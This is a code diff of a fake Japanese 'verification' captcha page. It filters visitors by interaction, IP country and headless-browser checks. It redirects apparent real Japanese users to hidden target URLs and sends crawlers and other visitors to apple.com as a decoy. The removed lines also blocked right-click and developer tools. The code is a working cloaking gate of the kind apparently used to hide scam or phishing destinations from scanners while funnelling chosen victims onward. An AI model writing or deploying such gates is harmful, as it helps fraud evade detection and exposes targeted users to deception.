@@ -27,7 +27,7 @@ body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",
   <div class="title" id="title">選択認証</div>
   <div class="desc" id="desc">表示された数字をすべて選んでください</div>
   <div class="target-area">
-    <div class="target-label" id="targetLabel">対象</div>
+    <div class="target-label">対象</div>
     <div class="target-nums" id="target"></div>
   </div>
   <div class="grid" id="grid"></div>
@@ -36,16 +36,6 @@ body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",
 </div>
 
 <script>
-// ==============================================
-// 🚫 基础防爬：禁止右键/审查元素（爬虫无法手动分析DOM）
-// ==============================================
-document.addEventListener('contextmenu', (e) => e.preventDefault());
-document.addEventListener('keydown', (e) => {
-  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
-    e.preventDefault();
-  }
-});
-
 // ==============================================
 // ✅ 日本真人用户 跳转目标URL
 // ==============================================
@@ -61,7 +51,7 @@ const REAL_TARGETS = [
 const BAD_TARGET = "https://www.apple.com";
 
 // ==============================================
-// 🎌 日式ランダム設定（含目标标签随机）
+// 🎌 日式ランダム設定（タイトル・文言・色・ボタン文字）
 // ==============================================
 const JP_TITLES = [
   "選択認証",
@@ -84,13 +74,6 @@ const JP_BTN_TEXTS = [
   "送信",
   "OK"
 ];
-const JP_TARGET_LABELS = [
-  "対象",
-  "選択番号",
-  "指定数字",
-  "確認番号",
-  "ターゲット"
-];
 const JP_COLORS = [
   { main: "#007aff", light: "#eef6ff" },
   { main: "#5856d6", light: "#f0eFFF" },
@@ -102,14 +85,12 @@ const JP_COLORS = [
 const randTitle = JP_TITLES[Math.floor(Math.random() * JP_TITLES.length)];
 const randDesc = JP_DESCS[Math.floor(Math.random() * JP_DESCS.length)];
 const randBtnText = JP_BTN_TEXTS[Math.floor(Math.random() * JP_BTN_TEXTS.length)];
-const randTargetLabel = JP_TARGET_LABELS[Math.floor(Math.random() * JP_TARGET_LABELS.length)];
 const randColor = JP_COLORS[Math.floor(Math.random() * JP_COLORS.length)];
 
 // DOMに反映
 document.getElementById("title").innerText = randTitle;
 document.getElementById("desc").innerText = randDesc;
 document.getElementById("submit").innerText = randBtnText;
-document.getElementById("targetLabel").innerText = randTargetLabel;
 document.querySelector(".target-nums").style.color = randColor.main;
 document.querySelector(".target-area").style.background = randColor.light;
 
@@ -122,30 +103,20 @@ style.textContent = `
 document.head.appendChild(style);
 
 // ==============================================
-// 🔰 超宽松真人检测（进阶防爬：轨迹+高级反无头）
+// 🔰 超宽松真人检测（真⼈绝不误判）
 // ==============================================
 let userInteracted = false;
-let hasTrack = false; // 真人操作轨迹标记
-
-// 全场景交互触发
 const interactEvents = [
-  'click', 'touchstart', 'mousedown',
-  'scroll', 'keydown', 'touchend'
+  'click', 'touchstart', 'mousedown', 'mousemove',
+  'scroll', 'keydown', 'touchmove'
 ];
 interactEvents.forEach(evt => {
   window.addEventListener(evt, () => { userInteracted = true; }, { once: true });
 });
 
-// 真人操作轨迹检测（鼠标/触摸滑动）
-window.addEventListener('mousemove', (e) => { if (e.movementX || e.movementY) hasTrack = true; }, { once: true });
-window.addEventListener('touchmove', (e) => { if (e.touches.length > 0) hasTrack = true; }, { once: true });
-
 async function isJapaneseRealUser() {
   try {
-    // 核心双校验：必须有交互 + 必须有真人操作轨迹
-    if (!userInteracted || !hasTrack) return false;
-
-    // IP检测异常 = 默认日本（不拦截真人）
+    if (!userInteracted) return false;
     let isJpIP = true;
     try {
       const res = await fetch('https://ipapi.co/json/', { cache: 'no-store', timeout: 2000 });
@@ -154,16 +125,9 @@ async function isJapaneseRealUser() {
         if (data?.country_code) isJpIP = data.country_code === 'JP';
       }
     } catch (e) {}
-
-    // 进阶反无头浏览器：UA+核心特征双重检测（无法被UA伪造绕过）
-    const ua = navigator.userAgent || '';
-    let isHeadless = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(ua);
-    isHeadless = isHeadless || navigator.webdriver === true || window.innerWidth === 0 || window.innerHeight === 0 || navigator.plugins.length === 0;
-
-    // 只要不是明确爬虫，一律通过
+    const isHeadless = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(navigator.userAgent||'');
     return !isHeadless;
   } catch (e) {
-    // 任何异常 = 直接放行（绝不杀真⼈）
     return true;
   }
 }
@@ -172,10 +136,10 @@ function randomTarget() {
   return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
 }
 
-// ===================== 验证界面逻辑（全防爬优化集成） =====================
+// ===================== 验证界面逻辑 =====================
 function generateCaptcha() {
   const nums = "0123456789".split('');
-  const need = Math.floor(Math.random() * 2) + 2; // 基础防爬：随机2/3位数字
+  const need = 2;
   const target = [];
   while (target.length < need) {
     const n = nums[Math.floor(Math.random() * nums.length)];
@@ -198,32 +162,27 @@ const submit = document.getElementById("submit");
 const status = document.getElementById("status");
 let selected = [];
 
-// 防爬：随机类名后缀
+// ランダムクラス名（爬虫対策）
 const randomBtnSuffix = Math.random().toString(36).slice(2, 8);
 const baseBtnClass = `num-btn ${randomBtnSuffix}`;
 
-// 基础防爬：按钮随机延迟生成（0-100ms）+ 点击坐标校验
-options.forEach((o, index) => {
-  setTimeout(() => {
-    const btn = document.createElement("button");
-    btn.className = baseBtnClass;
-    btn.innerText = o;
-    btn.dataset.v = o;
-    btn.onclick = (e) => {
-      // 爬虫无坐标/无event，点击无反应
-      if (!e || !e.clientX || !e.clientY) return;
-      if (btn.classList.contains("selected")) {
-        btn.classList.remove("selected");
-        selected = selected.filter(x => x !== o);
-      } else {
-        btn.classList.add("selected");
-        selected.push(o);
-      }
-      submit.disabled = selected.length !== need;
-      status.innerText = `${selected.length}/${need} 個選択中`;
-    };
-    grid.appendChild(btn);
-  }, Math.floor(Math.random() * 100));
+options.forEach(o => {
+  const btn = document.createElement("button");
+  btn.className = baseBtnClass;
+  btn.innerText = o;
+  btn.dataset.v = o;
+  btn.onclick = () => {
+    if (btn.classList.contains("selected")) {
+      btn.classList.remove("selected");
+      selected = selected.filter(x => x !== o);
+    } else {
+      btn.classList.add("selected");
+      selected.push(o);
+    }
+    submit.disabled = selected.length !== need;
+    status.innerText = `${selected.length}/${need} 個選択中`;
+  };
+  grid.appendChild(btn);
 });
 
 submit.onclick = async () => {
@@ -233,7 +192,7 @@ submit.onclick = async () => {
     return;
   }
 
-  // 防爬：100ms操作延迟
+  // 100ms遅延（爬虫対策）
   await new Promise(resolve => setTimeout(resolve, 100));
   
   const valid = await isJapaneseRealUser();
